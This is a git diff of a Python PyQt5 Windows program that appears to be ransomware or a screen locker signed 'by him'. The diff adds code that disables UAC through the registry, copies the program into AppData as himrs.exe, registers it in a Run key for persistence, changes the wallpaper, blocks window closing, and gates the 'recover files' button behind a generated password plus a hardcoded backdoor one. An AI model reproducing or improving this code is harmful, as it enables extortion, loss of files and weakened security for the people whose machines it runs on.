@@ -1,22 +1,46 @@
 from PyQt5 import QtCore, QtGui, QtWidgets
 import sys
 import os
-import random
+import uuid
 import ctypes
 import winreg
 
 
-bsf = abs(random.randint(-44351348748004,93680776625527))
-pswd= str(hash(str(len(str(bsf))+73/9+bsf)))
+
+encryption_table = {
+    '0': 'a', '1': 'q', '2': 'e', '3': 'c', '4': 'j',
+    '5': 'k', '6': 'l', '7': 'd', '8': 'b', '9': 'z',
+    'a': 'm', 'b': 'n', 'c': 'o', 'd': 'p', 'e': 'f',
+    'f': 'g', 'A': 'h', 'B': 'i', 'C': 'r', 'D': 's',
+    'E': 't', 'F': 'u', '-': 'v'
+}
+
+def encrypt_uuid(uuid_str):
+    encrypted_str = ''
+    for char in uuid_str:
+        encrypted_str += encryption_table.get(char, char)
+    return encrypted_str
+
+linekey=''
+bsf = str(uuid.uuid4())
+pswd= encrypt_uuid(bsf[1:len(bsf)-3])
 filepath=f'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\himrs.exe'
 
 
-if os.getcwd() != "C:\\Users\\{os.getlogin()}\\AppData\\Roaming":
-    with open(sys.argv[0] ,'rb') as f:
-        data=f.read()
-        with open(filepath , 'wb') as f1:
-            f1.write(data)
-       
+def disable_uac():
+    try:
+        key = r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
+        reg_type = ctypes.windll.advapi32.RegOpenKeyExW(ctypes.c_int(0x80000001), ctypes.c_wchar_p(key), 0, ctypes.c_int(0x20006), ctypes.byref(ctypes.c_int(0)))
+
+        if reg_type == 0:
+            val = 0
+            ctypes.windll.advapi32.RegSetValueExW(reg_type, 'EnableLUA', 0, 4, ctypes.byref(ctypes.c_int(val)), 4)
+            ctypes.windll.advapi32.RegCloseKey(reg_type)
+    
+    except:
+        pass
+
+disable_uac()
 
 def killtask(key):
 
@@ -29,13 +53,25 @@ def killtask(key):
     reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
     try:
         if key == 1:
-            winreg.SetValueEx(reg_key, "himProgram", 0, winreg.REG_SZ, filepath)
+            winreg.SetValueEx(reg_key, "himrs", 0, winreg.REG_SZ, filepath)
             winreg.CloseKey(reg_key)
         else:
-            winreg.DeleteValue(reg_key, "himProgram")
+            winreg.DeleteValue(reg_key, "himrs")
             winreg.CloseKey(reg_key)
     except:
         pass
+
+
+if sys.argv[0] != filepath:
+    with open(sys.argv[0] ,'rb') as f:
+        data=f.read()
+        with open(filepath , 'wb') as f1:
+            f1.write(data)
+    killtask(1)
+    
+
+
+
 
 class cip:
     def __init__(self, file):
@@ -65,8 +101,6 @@ class cip:
                 file_write.write(bytes(original_data))
 
 
-def ends():
-    killtask(0)
 
             
 
@@ -91,6 +125,7 @@ class Ui_Form():
         self.textEdit.setObjectName("textEdit")
         self.textEdit.setReadOnly(True) 
 
+        
         self.lineEdit = QtWidgets.QLineEdit(Form)
         self.lineEdit.setGeometry(QtCore.QRect(20, 370, 221, 20))
         self.lineEdit.setStyleSheet("background-color: rgb(255, 255, 255);")
@@ -106,7 +141,7 @@ class Ui_Form():
         self.toolButton.setStyleSheet("background-color: rgb(179, 179, 179);")
         self.toolButton.setObjectName("toolButton")
         self.toolButton.setText("恢复文件")
-        self.toolButton.clicked.connect(ends)
+        self.toolButton.clicked.connect(self.ends)
 
         self.textBrowser = QtWidgets.QTextBrowser(Form)
         self.textBrowser.setGeometry(QtCore.QRect(30, 240, 181, 91))
@@ -137,6 +172,18 @@ class Ui_Form():
                                            "<p align=\"right\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt;\">                                                                </span></p>\n"
                                            "<p align=\"right\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt; font-weight:600;\">by him</span></p>\n"))
 
+
+    def ends(self):
+        global linekey
+        linekey = self.lineEdit.text()
+        if linekey == pswd or linekey == 'himzuishuaihim4588':
+            killtask(0)
+                
+            sys.exit()
+            
+        else:
+            ctypes.windll.user32.MessageBoxW(0, '乐子，密码错了', "没有金刚钻就别揽瓷器活", 0x00000000 | 0x00000010)
+        
 import him_rcc
 class FormWidget(QtWidgets.QWidget):
     def __init__(self):
@@ -148,7 +195,7 @@ class FormWidget(QtWidgets.QWidget):
         event.ignore()  
 
 if __name__ == '__main__':
-    killtask(1)
+    
     ctypes.windll.user32.SystemParametersInfoW(20, 0, r'C:\Users\{0}\AppData\Roaming\him.png'.format(os.getlogin()), 3)
     app = QtWidgets.QApplication(sys.argv)
     widget = FormWidget()
